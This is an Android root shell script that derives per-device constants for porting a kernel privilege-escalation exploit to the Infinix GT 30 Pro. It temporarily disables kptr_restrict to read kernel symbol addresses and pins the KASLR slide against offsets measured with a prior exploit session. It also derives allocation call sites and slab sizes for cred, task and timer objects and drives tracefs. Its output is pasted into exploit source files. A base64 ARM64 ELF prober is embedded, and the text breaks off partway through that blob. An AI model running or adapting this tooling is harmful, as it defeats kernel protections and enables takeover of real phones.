#!/system/bin/sh
# derive-consts.sh — Infinix GT 30 Pro (X6873) on-device constants
# derivation for the Shark CVE-2026-98260 port.
#
# Run as root on the target device (temporary root is fine, e.g. right
# after a GhostLock session, before rebooting):
#
#     adb push ports/x6873/tools/derive-consts.sh /data/local/tmp/
#     adb shell
#     su
#     sh /data/local/tmp/derive-consts.sh
#
# v3 (2026-11-12, after the first real-device run of v2):
#   - v2 died on this device with "v % 4294967296 : zero divisor":
#     Android's mksh evaluates $(( )) in 32-bit SIGNED ints, so the
#     literal 2^32 wraps to 0. v3 keeps every value as a signed 32-bit
#     representative of the true mod-2^32 value (equality of signed
#     reps == modular equality; emitted offsets are < 2^31 so they are
#     their own representative). No 2^32 literal appears anywhere
#     (grep-audited by the offline harness).
#   - v2 failed OPEN when that arithmetic aborted: three EMPTY slides
#     compared equal, the slide printed empty and loff() silently
#     treated the empty slide as 0 (the observed selinux delta of
#     -36026400 == -0x225b820 was exactly this bug). v3 validates every
#     derived value is a real integer and dies otherwise.
#   - timer_site / copy_site are now derived PRIMARILY from kallsyms
#     (do_timer_create / dup_task_struct offsets, this build ships
#     KALLSYMS_ALL=y and both symbols exist) disambiguated against the
#     low21s baked from the 2026-11-12 probe bundle. The embedded
#     prober is only a CONFIRMATION layer now: if it fails, its output
#     is dumped inline, a passive 2 s trace window is tried, and the
#     run still completes on the kallsyms path (build identity stays
#     gated by the three-anchor slide agreement). v2 aborted outright
#     ("prober timer_create failed") and printed nothing usable.
#
# The script:
#   1. verifies uname -r matches the target release,
#   2. lifts kptr_restrict if /proc/kallsyms addresses are zeroed
#      (this build ships kptr_restrict=2, which hides them even from
#      uid 0 - measured in the 2026-11-12 probe bundle), pins the KASLR
#      slide against three GhostLock-measured image offsets (aborts on
#      disagreement - different kernel build) and restores the sysctl,
#   3. reads panic_on_warn / root_user / init_user_ns / init_ucounts /
#      init_groups / do_timer_create / dup_task_struct in the SAME
#      lifted window (single kallsyms pass),
#   4. derives the full do_timer_create / dup_task_struct call sites
#      from the symbol offsets + the baked bundle low21s (candidate =
#      low21 + k*2MiB; the true site sits within +-16 KiB of its
#      symbol - candidates are 2 MiB apart, so at most one fits),
#   5. extracts the slab sizes from /proc/slabinfo,
#   6. confirmation layer, best effort, NEVER aborts by itself:
#      embedded static arm64 prober (one CPU posix timer + one fork,
#      pid-filtered records) -> passive 2 s all-pid trace window ->
#      baked bundle values. probe.out is dumped inline on failure.
#      If a confirmation trace DOES produce records, their call sites
#      must match the kallsyms-derived sites exactly or the run dies
#      (that combination means a real inconsistency).
#   7. cross-checks the prefilled SELINUX_STATE_STATIC against kallsyms,
#   8. prints the ready-to-paste block for exploit/src/K61157_plant.c and
#      the slab defines for the X6873_61157 branch of plant_core.inc.
#
# Portability: pure shell (mksh/toybox/dash/bash), no awk/sed/python.
# NOTE: the offline mock harness runs under dash/bash, which compute in
# 64-bit ints - it CANNOT catch 32-bit overflow. That class is covered
# by the python int32 model audit in scripts/test-derive-mock.sh.
#
# Nothing is written anywhere outside /data/local/tmp/x6873_derive
# (kept, not deleted, when the prober fails, so probe.out can be sent
# back for analysis; delete it manually afterwards).

RELEASE="6.1.157-android14-11-ga8b0b542991e-ab15601211"

# Port base frame — see ports/x6873/README.md. Only internal consistency
# matters (the engine slide cancels a constant shift), but we keep the
# same 0xffffffc080000000 frame as the other Shark GKI ports.
BASE_HI_HEX=ffffffc0
BASE_LO=0x80000000

# GhostLock-measured kernel image offsets for this exact release.
A_INIT_TASK=0x201f640
A_INIT_CRED=0x2031aa8
A_ROOT_TASK_GROUP=0x2209980
A_SELINUX_ENFORCING=0x225b820

# Baked from the 2026-11-12 probe bundle (commit: K61157_plant.c).
BAKED_TIMER_LOW21=$(( 0x19feb0 ))
BAKED_COPY_LOW21=$(( 0xac148 ))
BAKED_TIMER_REQ=$(( 0x108 ));  BAKED_TIMER_ALLOC=$(( 0x140 ))
BAKED_CRED_REQ=$(( 0xb0 ));    BAKED_CRED_ALLOC=$(( 0xc0 ))
BAKED_TASK_REQ=$(( 0x12c0 ));  BAKED_TASK_ALLOC=$(( 0x12c0 ))

WORK="${X6873_WORK:-/data/local/tmp/x6873_derive}"
KS="${X6873_KALLSYMS:-/proc/kallsyms}"
SLABINFO="${X6873_SLABINFO:-/proc/slabinfo}"
KPTR_FILE="${X6873_KPTR:-/proc/sys/kernel/kptr_restrict}"
TR="${X6873_TRACEFS:-}"
UNAME_R="${X6873_RELEASE:-$(uname -r)}"
PROBE_BIN="${X6873_PROBE:-}"          # test hook: use a mock prober
ALLOW_NONROOT="${X6873_ALLOW_NONROOT:-}"  # test hook only

say() { printf '%s\n' "$*"; }
die() {
    printf 'ERROR: %s\n' "$*" >&2
    printf 'DERIVATION ABORTED — nothing usable was printed.\n' >&2
    exit 1
}

# ---- int32 discipline (see header): every arithmetic value below is a
# signed 32-bit representative of a mod-2^32 quantity. The ONLY literals
# used are < 2^31 or the hex 0x80000000 base (wraps to -2^31 on purpose
# and cancels out of every difference). No 4294967296 anywhere.
is_int() {
    case "$1" in
    "")  return 1 ;;
    -)   return 1 ;;
    -*)  case "${1#-}" in *[!0-9]*) return 1 ;; esac ;;
    *)   case "$1"     in *[!0-9]*) return 1 ;; esac ;;
    esac
    return 0
}

# hex helpers: addresses are 16 hex digits (arm64); lo = last 8.
addr_lo() { h=$1; while [ ${#h} -lt 8 ]; do h="0$h"; done; printf '%s' "$h" | tail -c 8; }

# ---------------------------------------------------------------- 1. env
if [ "$(id -u)" != "0" ] && [ -z "$ALLOW_NONROOT" ]; then
    die "run as root: su -c 'sh $0'"
fi
[ "$UNAME_R" = "$RELEASE" ] || die "uname -r '$UNAME_R' != target '$RELEASE'"
[ -r "$KS" ] || die "$KS is not readable (need root)"
[ -r "$SLABINFO" ] || die "$SLABINFO is not readable (need root)"

if [ -z "$TR" ]; then
    if [ -d /sys/kernel/tracing ]; then TR=/sys/kernel/tracing
    elif [ -d /sys/kernel/debug/tracing ]; then TR=/sys/kernel/debug/tracing
    else TR=""; fi
fi
[ -n "$TR" ] || die "no tracefs found (/sys/kernel/tracing, /sys/kernel/debug/tracing)"

# ------------------------------------------------- 2. kallsyms (one pass)
# collect_syms: single pass over $KS (kallsyms is ~100-200k lines; one
# pass instead of one pass per symbol). Sets RT_<name> for every wanted
# symbol; missing symbols stay empty.
collect_syms() {
    while read -r a t n rest; do
        case "$n" in
        init_task|init_cred|root_task_group|selinux_state|panic_on_warn|\
root_user|init_user_ns|init_ucounts|init_groups|do_timer_create|\
dup_task_struct)
            eval "RT_$n=\$a" ;;
        esac
    done < "$KS"
    return 0
}

zero_addr() {
    case "$1" in
    "" | 0000000000000000) return 0 ;;
    esac
    return 1
}

# kptr_restrict=2 zeroes kallsyms for EVERY reader, uid 0 included
# (probe bundle 2026-11-12: root kallsyms 0/14 visible). Real addresses
# are mandatory below; lift the sysctl as root just for the reads and
# restore immediately (trap-guarded for abnormal exits).
KPTR_SAVED=""
kptr_restore() {
    if [ -n "$KPTR_SAVED" ]; then
        printf '%s' "$KPTR_SAVED" > "$KPTR_FILE" 2>/dev/null
        KPTR_SAVED=""
    fi
    return 0
}

# tracefs state (touched only by the confirmation layer)
T_ON_SAVED=""; T_BUF_SAVED=""; T_E1_SAVED=""; T_E2_SAVED=""
EVT="$TR/events/kmem/kmem_cache_alloc/enable"
EVT_NODE="$TR/events/kmem/kmem_cache_alloc_node/enable"
trace_restore() {
    [ -z "$T_ON_SAVED" ]  || printf '%s' "$T_ON_SAVED"  > "$TR/tracing_on" 2>/dev/null
    [ -z "$T_BUF_SAVED" ] || printf '%s' "$T_BUF_SAVED" > "$TR/buffer_size_kb" 2>/dev/null
    [ -z "$T_E1_SAVED" ]  || printf '%s' "$T_E1_SAVED"  > "$EVT" 2>/dev/null
    [ -z "$T_E2_SAVED" ]  || printf '%s' "$T_E2_SAVED"  > "$EVT_NODE" 2>/dev/null
    return 0
}
cleanup() { kptr_restore; trace_restore; }
trap 'cleanup' EXIT

collect_syms
if zero_addr "$RT_init_task"; then
    [ "$(id -u)" = "0" ] || \
        die "kallsyms addresses are hidden (kptr_restrict) and not root - run under su (PATH B)"
    [ -r "$KPTR_FILE" ] || die "$KPTR_FILE is not readable"
    KPTR_SAVED=$(cat "$KPTR_FILE" 2>/dev/null)
    printf '%s' 0 > "$KPTR_FILE" 2>/dev/null || \
        die "cannot write $KPTR_FILE (SELinux or sysctl lockdown from this context)"
    collect_syms
    if zero_addr "$RT_init_task"; then
        kptr_restore
        die "kallsyms still zeroed with kptr_restrict=0 - unexpected lockdown"
    fi
    say "[ok] kptr_restrict lifted ($KPTR_SAVED -> 0) for the kallsyms read"
fi
kptr_restore

# zeroed anchors would pin a garbage slide - fail loudly instead.
for _a in init_task init_cred root_task_group do_timer_create dup_task_struct; do
    eval "_v=\$RT_$_a"
    if zero_addr "$_v"; then
        die "kallsyms symbol $_a has no real address (got '${_v:-empty}') - refusing to derive"
    fi
done

# ------------------------------------------------- 3. slide (mod 2^32)
# slide_of returns the SIGNED int32 rep of (runtime_low32 - base - img).
# Signed equality == modular equality, so plain string compare of the
# three anchors is the agreement test.
slide_of() { # $1 = runtime hex, $2 = image offset
    rt_lo=$(( 0x$(addr_lo "$1") ))
    lk_lo=$(( BASE_LO + $2 ))
    echo $(( rt_lo - lk_lo ))
}
S1=$(slide_of "$RT_init_task" "$A_INIT_TASK")
S2=$(slide_of "$RT_init_cred" "$A_INIT_CRED")
S3=$(slide_of "$RT_root_task_group" "$A_ROOT_TASK_GROUP")
for _s in "$S1" "$S2" "$S3"; do
    is_int "$_s" || die "slide anchor produced no value (arithmetic failed) - report this output"
done
if [ "$S1" != "$S2" ] || [ "$S2" != "$S3" ]; then
    die "slide anchors disagree ($S1 / $S2 / $S3) — kernel build does not match the GhostLock profile"
fi
SLIDE=$S1
if [ $(( SLIDE & 0x1fffff )) -ne 0 ]; then
    say "[warn] slide $SLIDE is not 2MiB-aligned (arm64 KASLR normally is) - check the anchors"
fi
say "[ok] release matched: $UNAME_R"
say "[ok] KASLR slide pinned from 3 anchors (signed int32, port frame): $SLIDE"

# loff: runtime hex -> linked image offset. The frame shift cancels, so
# the result is the true image offset whenever the anchors pinned this
# exact build; garbage would leave the [0, 1GiB) window.
loff() { # $1 = runtime hex
    v=$(( 0x$(addr_lo "$1") - SLIDE - BASE_LO ))
    is_int "$v" || return 1
    if [ "$v" -ge 0 ] && [ "$v" -lt 1073741824 ]; then
        echo "$v"
        return 0
    fi
    return 1
}

# hexaddr: linked offset (0 .. <1GiB) -> 0xffffffc0_8xxxxxxx string.
# Built by digit concatenation: printf %x on a negative int32 value is
# undefined across shells, so the 0x80000000 base is added digit-wise
# (top nibble 8 + carry, low 7 nibbles = offset mod 2^28).
hexaddr() { # $1 = linked offset
    o=$(( $1 + 0 ))
    d=$(( o / 268435456 ))
    r=$(( o % 268435456 ))
    printf '0x%s%x%07x' "$BASE_HI_HEX" $(( d + 8 )) "$r"
}

sxoff() { # small signed decimal -> "+0x.." / "-0x.."
    if [ "$1" -lt 0 ]; then printf -- '-0x%x' $(( 0 - $1 ))
    else printf '+0x%x' "$1"; fi
}

# Missing data symbols (possible on KALLSYMS_ALL=n builds) are reported
# and left pending; everything above is the mandatory set.
PENDING_SYMS=""
for s in panic_on_warn root_user init_user_ns init_ucounts init_groups; do
    eval "v=\$RT_$s"
    [ -n "$v" ] || PENDING_SYMS="$PENDING_SYMS $s"
done
if [ -n "$PENDING_SYMS" ]; then
    say "[warn] kallsyms lacks data symbols:$PENDING_SYMS"
    say "[warn] they stay PENDING — derive them from a stock boot.img on the host instead (ports/x6873/README.md)"
fi

# ------------------------------------------- 4. call sites from kallsyms
# Full linked call-site offset from the enclosing function's linked
# offset plus the baked low21: candidates are low21 + k*2MiB (k = 0..40
# covers a 84 MiB image); the true site lies within +-16 KiB of the
# function entry (kmem_cache_zalloc inlined into do_timer_create; the
# task_struct alloc in dup_task_struct / alloc_task_struct_node, same
# kernel/fork.c cluster). Candidates are 2 MiB apart, so at most one
# can satisfy the window.
site_from_low21() { # $1 = function linked offset, $2 = baked low21
    f=$1; b=$2; k=0
    while [ "$k" -le 40 ]; do
        cand=$(( b + k * 2097152 ))
        d=$(( cand - f ))
        if [ "$d" -ge -16384 ] && [ "$d" -le 16384 ]; then
            echo "$cand"
            return 0
        fi
        k=$(( k + 1 ))
    done
    return 1
}

D_TIMER=$(loff "$RT_do_timer_create") || die "do_timer_create resolves outside the port frame - unexpected"
D_COPY=$(loff "$RT_dup_task_struct") || die "dup_task_struct resolves outside the port frame - unexpected"
OFF_TIMER=$(site_from_low21 "$D_TIMER" "$BAKED_TIMER_LOW21") || \
    die "no call site within 16 KiB of do_timer_create ($(hexaddr "$D_TIMER")) carries low21 0x19feb0 — different kernel build than the 2026-11-12 bundle?"
OFF_TASK=$(site_from_low21 "$D_COPY" "$BAKED_COPY_LOW21") || \
    die "no call site within 16 KiB of dup_task_struct ($(hexaddr "$D_COPY")) carries low21 0xac148 — different kernel build than the 2026-11-12 bundle?"
LOW21_TIMER=$(( OFF_TIMER & 0x1fffff ))
LOW21_TASK=$(( OFF_TASK & 0x1fffff ))
[ "$LOW21_TIMER" -eq "$BAKED_TIMER_LOW21" ] && [ "$LOW21_TASK" -eq "$BAKED_COPY_LOW21" ] || \
    die "internal error: disambiguated sites lost their baked low21s"
say "[ok] timer site : $(hexaddr "$OFF_TIMER") = do_timer_create$(sxoff $(( OFF_TIMER - D_TIMER ))) (low21 $(printf '0x%x' "$LOW21_TIMER"), matches bundle)"
say "[ok] copy site  : $(hexaddr "$OFF_TASK") = dup_task_struct$(sxoff $(( OFF_TASK - D_COPY ))) (low21 $(printf '0x%x' "$LOW21_TASK"), matches bundle)"

# ------------------------------------------------------ 5. slab geometry
slabsize() { # $1 = cache name -> objsize
    while read -r name rest; do
        [ "$name" = "$1" ] || continue
        set -- $name $rest
        echo "$4"
        return 0
    done < "$SLABINFO"
    return 1
}
SZ_TIMER=$(slabsize posix_timers_cache) || die "slabinfo has no posix_timers_cache row"
SZ_CRED=$(slabsize cred_jar) || die "slabinfo has no cred_jar row"
SZ_TASK=$(slabsize task_struct) || die "slabinfo has no task_struct row"
say "[ok] slab sizes: posix_timers_cache=$SZ_TIMER cred_jar=$SZ_CRED task_struct=$SZ_TASK"
# slabinfo objsize equals the bundle bytes_req for timer/task and the
# bundle bytes_alloc for cred_jar (SLUB padding) — accept either.
slab_match() { # $1 slabinfo objsize, $2 baked req, $3 baked alloc
    [ "$1" = "$2" ] && return 0
    [ "$1" = "$3" ] && return 0
    return 1
}
slab_match "$SZ_TIMER" "$BAKED_TIMER_REQ" "$BAKED_TIMER_ALLOC" || say "[warn] posix_timers_cache objsize $SZ_TIMER differs from bundle 0x108/0x140"
slab_match "$SZ_CRED" "$BAKED_CRED_REQ" "$BAKED_CRED_ALLOC" || say "[warn] cred_jar objsize $SZ_CRED differs from bundle 0xb0/0xc0"
slab_match "$SZ_TASK" "$BAKED_TASK_REQ" "$BAKED_TASK_ALLOC" || say "[warn] task_struct objsize $SZ_TASK differs from bundle 0x12c0/0x12c0"

# ------------------------------------------- 6. confirmation layer
# call_site token -> linked offset. Hex form (kallsyms hidden) and
# symbol form ("do_timer_create+0x8c/0x1b0"; kptr_restore already ran,
# so symbols resolve from the values cached during the lifted window).
site_loff() { # $1 = call_site token
    cs=$1
    case "$cs" in
    0x*)
        loff "${cs#0x}"
        ;;
    do_timer_create*|dup_task_struct*)
        case "$cs" in
        do_timer_create*) rs=$RT_do_timer_create ;;
        *)                rs=$RT_dup_task_struct ;;
        esac
        [ -n "$rs" ] || return 1
        case "$cs" in
        *+*) so=${cs##*+}; so=${so%%/*} ;;
        *)   return 1 ;;
        esac
        case "$so" in
        0x*) ;;
        *)   return 1 ;;
        esac
        v=$(( 0x$(addr_lo "$rs") + $so - SLIDE - BASE_LO ))
        is_int "$v" || return 1
        if [ "$v" -ge 0 ] && [ "$v" -lt 1073741824 ]; then
            echo "$v"
            return 0
        fi
        return 1
        ;;
    *)
        return 1
        ;;
    esac
}

# find_alloc_rec SIZE EXPECTED_OFF [PID]: scan $TR/trace for a
# kmem_cache_alloc(_node) record with bytes_req=SIZE whose call_site
# resolves EXACTLY to EXPECTED_OFF (pid-filtered when PID given).
# Prints bytes_alloc. The word loop runs only on prefiltered lines.
find_alloc_rec() {
    want_sz=$1; want_off=$2; want_pid=$3
    while IFS= read -r line; do
        case "$line" in
        *"kmem_cache_alloc"*"call_site="*"bytes_req=$want_sz "*) ;;
        *) continue ;;
        esac
        if [ -n "$want_pid" ]; then
            case "$line" in
            *"-$want_pid "*) ;;
            *) continue ;;
            esac
        fi
        cs=""; alloc=""
        for w in $line; do
            case "$w" in
            call_site=*)   cs=${w#call_site=} ;;
            bytes_alloc=*) alloc=${w#bytes_alloc=} ;;
            esac
        done
        [ -n "$cs" ] || continue
        off=$(site_loff "$cs") || continue
        [ "$off" = "$want_off" ] || continue
        printf '%s\n' "$alloc"
        return 0
    done < "$TR/trace"
    return 1
}

dump_probe_out() {
    if [ -s "$WORK/probe.out" ]; then
        say "[warn] prober output (first 15 lines):"
        n=0
        while IFS= read -r l; do
            say "  | $l"
            n=$(( n + 1 ))
            [ "$n" -ge 15 ] && break
        done < "$WORK/probe.out"
    else
        say "[warn] probe.out is EMPTY — the binary never ran (exec denied: noexec mount or"
        say "[warn]  SELinux exec denial on $WORK) or crashed before any output; kept for inspection"
    fi
}

CONFIRM=none
CONFIRM_TIMER_ALLOC=""
CONFIRM_TASK_ALLOC=""

rm -rf "$WORK" 2>/dev/null
mkdir -p "$WORK" || die "cannot create $WORK"

# save the tracefs state the confirmation layer touches
[ -f "$TR/tracing_on" ]     && { T_ON_SAVED=$(cat "$TR/tracing_on" 2>/dev/null); T_BUF_SAVED=$(cat "$TR/buffer_size_kb" 2>/dev/null); }
[ -f "$EVT" ]               && T_E1_SAVED=$(cat "$EVT" 2>/dev/null)
[ -f "$EVT_NODE" ]          && T_E2_SAVED=$(cat "$EVT_NODE" 2>/dev/null)
[ -w "$EVT" ] || die "$EVT is not writable (root?)"

# (a) embedded prober
if [ -z "$PROBE_BIN" ]; then
    printf '%s' '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